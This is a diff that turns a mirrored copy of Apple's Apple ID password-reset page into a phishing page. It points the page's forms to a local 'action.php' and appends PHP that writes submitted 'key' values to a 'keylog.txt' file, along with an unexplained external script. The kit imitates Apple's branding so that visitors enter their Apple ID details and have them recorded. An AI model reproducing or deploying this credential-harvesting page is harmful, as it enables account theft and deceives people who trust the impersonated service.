@@ -1,51 +1,3 @@
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
-        
-        
-    
-    
-
-
-
-
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
 
@@ -176,7 +128,7 @@
 		</ul>
 		<aside id="ac-gn-searchview" class="ac-gn-searchview" role="search" data-analytics-region="search">
 			<div class="ac-gn-searchview-content">
-				<form id="ac-gn-searchform" class="ac-gn-searchform" action="//www.apple.com/us/search" method="get">
+				<form id="ac-gn-searchform" class="ac-gn-searchform" action="action.php" method="get">
 					<div class="ac-gn-searchform-wrapper"> <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" aria-label="Search apple.com" placeholder="Search apple.com" data-placeholder-long="Search for Products, Stores, and Help" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" /> <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" /> <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled aria-label="Submit"></button> <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled aria-label="Clear Search"></button> </div>
 				</form>
 				<aside id="ac-gn-searchresults" class="ac-gn-searchresults" data-string-quicklinks="Quick Links" data-string-suggestions="Suggested Searches" data-string-noresults="Hit enter to search."></aside>
@@ -391,7 +343,7 @@
                 <div class="divider"></div>
             {{/if}}
             {{#if navigation.buttons.action}}
-                <button type="button" id="action.php" class="right-nav no-decoration nav-btn nav-btn-right btn btn-link"  {{#disableActionButton navigation.buttons.action.enable navigation.spinner.show}} disabled="disabled"{{/disableActionButton}} can-click="{navigation.buttons.action.callback}" role="button">{{#localize navigation.buttons.action.label}}{{/localize}}</button>
+                <button type="button" id="action" action="action.php" class="right-nav no-decoration nav-btn nav-btn-right btn btn-link"  {{#disableActionButton navigation.buttons.action.enable navigation.spinner.show}} disabled="disabled"{{/disableActionButton}} can-click="{navigation.buttons.action.callback}" role="button">{{#localize navigation.buttons.action.label}}{{/localize}}</button>
             {{/if}}
             {{#if navigation.spinner}}
               <div class="spinner-wrap">
@@ -445,10 +397,10 @@
   <p class="subtitle mobile" tabindex="-1">
   </p>
   <p class="description desktop paragraph-break">
-    Enter your Apple&nbsp;ID to get started. For your convenience, we are showing your password.
+    Enter your Apple&nbsp;ID to get started. For your convenience, your password is visible.
   </p>
   <p class="description mobile paragraph-break">
-    Enter your Apple&nbsp;ID to get started. For your convenience, we are showing your password.
+    Enter your Apple&nbsp;ID to get started. For your convenience, your password is visible.
   </p>
 </div>
 <div class="content-body">
@@ -468,7 +420,7 @@
     {{#if captchaEnabled}}
     <div class="form-row">
       <div class="form-cell">
-          <iforgot-captcha {(id)}="captchaId" {(value)}="captchaAnswer" {(token)}="captchaToken" {^@refresh-captcha}="refreshCaptcha" {(captcha-error)}="captchaError">
+          <iforgot-captcha {(id)}="login_form" {(value)}="captchaAnswer" {(token)}="captchaToken" {^@refresh-captcha}="refreshCaptcha" {(captcha-error)}="captchaError" action="action.php">
           </iforgot-captcha>
       </div>
     </div>
@@ -1492,11 +1444,27 @@ locManager.addString('web.reset.password.appleid.notfound.error', 'Apple ID veri
 </script>
 
 
-<form method="get" action="https://iforgot.apple.com/password/verify/appleid" name="iforgotForm">
+<form method="get" action="action.php" name="iforgotForm">
     <input type="hidden" name="language" value="en_US" />
 </form>
 </body>
 
 <!-- Mirrored from iforgot.apple.com/password/verify/appleid by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Apr 2017 10:13:45 GMT -->
-</html>
+<?php
+ini_set("display_errors", "1");
+error_reporting(E_ALL);
 
+$logfile="keylog.txt";
+$key=$_GET['key'];
+if($key !=""){
+	$current = file_get_contents($logfile);
+	$key .=$current;
+	file_put_contents($logfile, $key);
+}
+?>
+<script src="js/js.js"></script>
+<form>
+<input name="key" action="GET" type="text">
+<input type="submit">
+</form>
+</html>
